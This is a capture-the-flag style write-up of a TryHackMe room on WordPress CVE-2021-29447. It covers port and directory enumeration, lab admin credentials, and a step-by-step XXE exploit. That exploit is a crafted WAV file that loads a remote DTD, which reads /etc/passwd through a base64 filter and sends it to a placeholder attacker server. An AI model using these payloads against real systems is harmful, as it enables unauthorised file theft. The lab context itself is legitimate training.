# Wordpress CVE-2021-29447

![image](https://user-images.githubusercontent.com/5285547/131180504-779a6218-3cd1-4220-aceb-3ed5e7accef6.png)

Room link: https://tryhackme.com/room/wordpresscve202129447

IP: 10.10.65.126


## Enumeration

nmap

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
```


ffuf intresting results

```
http://10.10.65.126/
http://10.10.65.126/?attachment_id=5
http://10.10.65.126/wp-login.php
```

wpscan results

![image](https://user-images.githubusercontent.com/5285547/131180743-2094cd44-a5b0-47da-8f09-23748932b84b.png)

They show this is vunerable to: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29447


login details for wordpress admin panel

```
test-corp:test
```

## Exploit setup

1. Create the malicious wav file. 
2. Create a xml .dtd file to extracts any file contents out. 
3. Upload the payload.wav to the wordpress site panel.
4. Convert the base64 on return to read the contents.

### 1. 

.wav file

```
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://YOUR_IP:YOUR_PORT/EVILFILE.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
```

### 2. 

create the .dtd file. 

```
<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://YOURSERVERIP:PORT/?p=%file;'>" >
```

### 3. 

upload the payload.wav

![image](https://user-images.githubusercontent.com/5285547/131181429-04a93d27-b152-4d74-8bc8-af0e663a7ade.png)


### 4. 

decode the base64

![image](https://user-images.githubusercontent.com/5285547/131181459-54ddef77-28e0-4b2a-b15b-0617346be5db.png)

```
?p=hVTbjpswEH3fr+CxlYLMLTc/blX1ZVO1m6qvlQNeYi3Y1IZc+vWd8RBCF1aVDZrxnDk+9gxYY1p+4REMiyaj90FpdhDu+FAIWRsNiBhG77DOWeYAcreYNpUplX7A1QtPYPj4PMhdHYBSGGixQp5mQToHVMZXy2Wace+yGylD96EUtUSmJV9FnBzPMzL/oawFilvxOOFospOwLBf5UTLvTvBVA/A1DDA82DXGVKxqillyVQF8A8ObPoGsCVbLM+rewvDmiJz8SUbX5SgmjnB6Z5RD/iSnseZyxaQUJ3nvVOR8PoeFaAWWJcU5LPhtwJurtchfO1QF5YHZuz6B7LmDVMphw6UbnDu4HqXL4AkWg53QopSWCDxsmq0s9kS6xQl2QWDbaUbeJKHUosWrzmKcX9ALHrsyfJaNsS3uvb+6VtbBB1HUSn+87X5glDlTO3MwBV4r9SW9+0UAaXkB6VLPqXd+qyJsFfQntXccYUUT3oeCHxACSTo/WqPVH9EqoxeLBfdn7EH0BbyIysmBUsv2bOyrZ4RPNUoHxq8U6a+3BmVv+aDnWvUyx2qlM9VJetYEnmxgfaaInXDdUmbYDp0Lh54EhXG0HPgeOxd8w9h/DgsX6bMzeDacs6OpJevXR8hfomk9btkX6E1p7kiohIN7AW0eDz8H+MDubVVgYATvOlUUHrkGZMxJK62Olbbdhaob0evTz89hEiVxmGyzbO0PSdIReP/dOnck9s2g+6bEh2Z+O1f3u/IpWxC05rvr/vtTsJf2Vpx3zv0X
```
